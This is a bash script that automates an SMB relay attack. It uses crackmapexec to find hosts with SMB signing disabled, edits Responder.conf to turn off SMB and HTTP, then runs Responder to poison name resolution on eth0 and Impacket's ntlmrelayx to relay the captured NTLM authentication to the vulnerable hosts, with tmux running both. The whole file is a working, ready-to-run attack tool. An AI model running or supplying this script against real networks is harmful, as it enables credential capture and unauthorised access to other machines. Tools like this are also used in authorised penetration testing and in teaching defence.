#!/bin/bash

responder_config_file="/etc/responder/Responder.conf"
session_name="smb_relay_attack"
window1="responder"
window2="ntlmrelayx"
TARGET_SMB_FILE="vulnerable_smb_targets.txt" 

# Print help
print_help() {
    echo "Usage: $0 [-f TARGET_FILE] [-h]"
    echo "  -f TARGET_FILE   The file containing all targets to scan for misconfigured smb signing."
    echo "  -h               Display this help and exit"
}

# Check if a tool is installed
check_tool() {
    echo "[*] Checking $1 if installed..."
    if ! which $1 >/dev/null; then
        echo "[!] $1 is not installed. Please install it and try again."
        exit 1
    fi
}

# Run crackmapexec
run_crackmapexec() {
    # Check if the target list for SMB Relay already exists
    if [[ ! -f "${TARGET_SMB_FILE}" ]]; then
        echo "[*] Commence checking on targets with misconfigured smb signing"
        echo "[*] Generating list of misconfigured smb signing targets in this output file "${TARGET_SMB_FILE}" via crackmapexec..."
        crackmapexec smb --gen-relay-list "${TARGET_SMB_FILE}" "${TARGET_FILE}" | grep "signing:False"
    fi
}

# Edit Responder.conf file
edit_responder_conf() {
    if [ -f "${responder_config_file}" ]; then
        if grep -qE '^SMB = Off$' "${responder_config_file}" && grep -qE '^HTTP = Off$' "${responder_config_file}"; then
            echo "[*] Responder.conf already has SMB and HTTP settings set to 'Off'."
            return
        else
            echo "[*] Turning off SMB and HTTP on Responder.conf..."
            sudo sed -i 's/^SMB = .*/SMB = /' "${responder_config_file}"
            sudo sed -i "/^SMB =/ s/$/Off/" "${responder_config_file}"
            sudo sed -i 's/^HTTP = .*/HTTP = /' "${responder_config_file}"
            sudo sed -i "/^HTTP =/ s/$/Off/" "${responder_config_file}"
            echo "[+] Turned off SMB and HTTP successfully."
        fi
    else
        echo "[!] Responder.conf file not found. Please make sure Responder is installed and configured properly."
        exit 1
    fi
}

# Run SMB Relay Attack
run_smb_relay_attack() {
    echo "[*] Starting SMB Relay Attack..."
    # create tmux session
    echo "[+] Creating session named ${session_name}..."
    tmux new-session -d -s $session_name
    # add responder window
    echo "[+] Creating window named ${window1}..."
    tmux rename-window $window1
    echo "[*] Running responder on window ${window1}..."
    # run the responder
    tmux send-keys "responder -I eth0" C-m
    # add ntlmrelayx window
    echo "[+] Creating window named ${window2}..."
    tmux new-window
    tmux rename-window $window2
    # run the ntlmrelayx
    echo "[*] Running Impacket's ntlmrelayx on window ${window2}..."
    tmux send-keys "impacket-ntlmrelayx -smb2support -tf ${TARGET_SMB_FILE}" C-m
    # attach tmux session
    tmux -CC attach-session -t $session_name
}

while getopts "f:h" opt; do
    case $opt in
    f)
        TARGET_FILE="$OPTARG"
        ;;
    h)
        print_help
        exit 0
        ;;
    \?)
        echo "[!] Invalid option: -$OPTARG" >&2
        exit 1
        ;;
    :)
        echo "[!] Option -$OPTARG requires an argument." >&2
        exit 1
        ;;
    esac
done

# Start SMB Relay Attack
if  tmux list-session | grep -qE "^$session_name:" > /dev/null; then
    echo "[!] Session name ${session_name} already exists."
    # attach tmux session
    tmux -CC attach-session -t $session_name
else
    # Check required arguments
    if [ -z "${TARGET_FILE}" ]; then
        echo "[!] Usage: ./$0 [-f TARGET_FILE]"
        exit 1
    fi
    # Check if required tools are installed
    check_tool "tmux"
    check_tool "responder"
    check_tool "impacket-ntlmrelayx"
    check_tool "crackmapexec"
    run_crackmapexec
    if [ -s "${TARGET_SMB_FILE}" ]; then
        edit_responder_conf
        sleep 2
        run_smb_relay_attack
    else
        echo "[!] There are no misconfigured smb signing targets found. Exiting..."
    fi
fi
